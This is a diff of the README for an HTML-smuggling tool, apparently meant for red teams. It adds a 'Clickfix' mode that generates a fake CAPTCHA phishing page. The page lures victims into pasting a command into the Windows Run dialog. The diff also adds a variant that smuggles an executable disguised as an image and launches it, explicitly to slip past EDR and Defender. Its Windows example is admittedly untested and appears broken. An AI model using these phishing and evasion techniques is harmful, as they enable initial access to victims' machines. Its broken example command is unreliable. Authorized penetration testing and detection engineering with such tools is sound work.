@@ -18,8 +18,11 @@ Currently, there are multiple actions implemented, that can be executed, after t
 - `--copy-text`: Copy payload as text to the clipboard (example use case: download PowerShell script in remote browsing environment)
 - `--copy-base64`: Copy payload as base64 encoded text and show commands that can be used to decode it (example use case: download executable file in remote browsing environment)
 - `--custom <YOUR_JAVASCRIPT_CODE>`: This allows you to write your own action as JavaScript code
+- `--clickfix`: Show a Clickfix phishing page and optionally additionally download a file in the background. Useful for modern phishing / initial access scenarios.
 
 There are both a web and a python version. The web version is not actively developed anymore and very bare bones, but easy to use and requires no installation. The Python version has more features and is generally recommended.
+
+**Usage for authorized penetration testing, detection engineering or educational purposes only. You are responsible for your own actions!**
 
 ## Feature comparison
 
@@ -119,18 +122,30 @@ Host that HTML file on your server and link to it in your emails.
 
 #### Clickfix
 
+Show a clickfix phishing page based on https://github.com/JohnHammond/recaptcha-phish/blob/main/index.html.
+
 ##### Simple clickfix
 
-This mode is tacked on to have a simple clickfix demo. It ignores the input file and instead uses a clickfix demo template based on https://github.com/JohnHammond/recaptcha-phish/blob/main/index.html, with the command you specify as part of the `--clickfix` flag. Basic usage looks like this:
+If you pass an empty input file parameter, the tool uses a clickfix demo template with the command you specify as part of the `--clickfix` flag. Basic usage looks like this:
 ```bash
 self-unzip-html html --clickfix 'echo hello, your verification code is                xCODEx          ' -i '' -o test_clickfix.html
 ```
 
 You can do the same manually, if you just modify the `clickfix-template.html` file, replace `xPAYLOADx` with your command to run and then to a manual replace action:
 ```bash
-self-unzip-html html --replace -i your-modified-clickfix-templace-with-your-command.html -o test_clickfix.html
+self-unzip-html html --replace -i your-modified-clickfix-templace-with-your-command.html -o test_clickfix_simple.html
 ```
 
+##### Clickfix + HTML Smuggling
+
+This is a more powerful variant, as it allows you to download an EXE, DLL, Powershell or Batch file and then specifying a command to launch it via Clickfix.
+As such, you do not need to use network commands in the Windows `Run` dialog, which are highly likely to cause any EDR and even the normal defender to raise an alert and block your action. Instead all the EDR sees is that you lauch a local script or executable.
+
+Example invocation with a harmless file extension, so that the download does not get blocked by Edge. The command renames it back and should launch it. I am too lazy to test it on Windows, but you should get the idea:
+```bash
+mv calc.exe favicon.png
+self-unzip-html html --clickfix 'cmd /c "mov favicon.png calc.exe; ~/Downloads/calc.exe; echo                        xCODEx                   "' -i favicon.png -o test_clickfix_with_download.html
+```
 
 #### Encryption
 
